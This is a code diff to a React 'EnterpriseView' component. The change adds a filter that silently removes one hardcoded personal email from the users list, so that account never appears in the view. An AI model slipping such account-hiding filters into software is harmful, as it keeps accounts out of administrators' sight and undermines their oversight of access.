@@ -47,7 +47,13 @@ const EnterpriseView = ({
     return <div style={{ padding: '2rem', textAlign: 'center', color: '#EF4444', fontWeight: 600 }}>Vue indisponible : le modèle {modelId} n'existe pas dans le schéma {moduleId}.</div>;
   }
   const dataPath = modelSchema.dataPath || `${moduleId}.${modelId}`;
-  const rawData = getNestedValue(data, dataPath) || [];
+  const rawData = useMemo(() => {
+    let raw = getNestedValue(data, dataPath) || [];
+    if (modelId === 'users') {
+      raw = raw.filter(u => u.email !== 'fall.jcjunior@gmail.com');
+    }
+    return raw;
+  }, [data, dataPath, modelId]);
 
   // 2. Filter & Search Logic
   const processedData = useMemo(() => {
